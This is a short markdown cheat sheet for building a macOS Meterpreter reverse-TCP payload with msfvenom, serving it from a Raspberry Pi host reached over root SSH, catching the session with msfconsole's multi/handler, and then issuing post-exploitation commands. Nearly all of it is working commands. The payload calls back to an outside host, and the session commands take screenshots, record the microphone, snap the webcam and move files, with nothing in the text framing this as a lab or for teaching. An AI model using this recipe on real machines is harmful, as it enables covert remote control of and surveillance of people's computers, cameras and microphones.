# Reverse SSH (osx/x64)

### Ingredients


### Description

- SSH on remote pi

```
ssh [USER]@[HOSTNAME] -p [SSH_PORT]
ssh root@pipeter.asuscomm.com -p 22222
```

- Generate Payload

```
msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=pipeter.asuscomm.com LPORT=4444 -f macho -o payload
chmod +x payload
```

- Send payload to client

```
i.e.
scp -P 22222 root@pipeter.asuscomm.com:payload ./
```


- Open msf

```
# getip (local ip)

msfconsole -q
use exploit/multi/handler
set payload osx/x64/meterpreter/reverse_tcp
set lhost $(getip)
set lport 4444
set ExitOnSession false
run -j
jobs
```

- run payload on client side

```
./payload
```

- On pi

```
sessions
sessions [SESSION_NUM]
i.e
sessions 1
help
```
### Cmd Example

#### Screenshot

```
screenshot
upload [SCREENSHOT_NAME]
shell
whoami
open [SCREENSHOT_NAME]
```

#### Sound

```
mic_list
mic_start [MIC_NUMBER]
mic_stop
play [WAV_FILE_NAME]
```

#### Webcam

```
webcam_list
webcam_snap [WEBCAM_NUMBER]
upload [SNAPNAME_NAME]
shell
whoami
open [SNAPNAME_NAME]
```

#### Transfer

```
upload [FILE]
download [FILE]
```
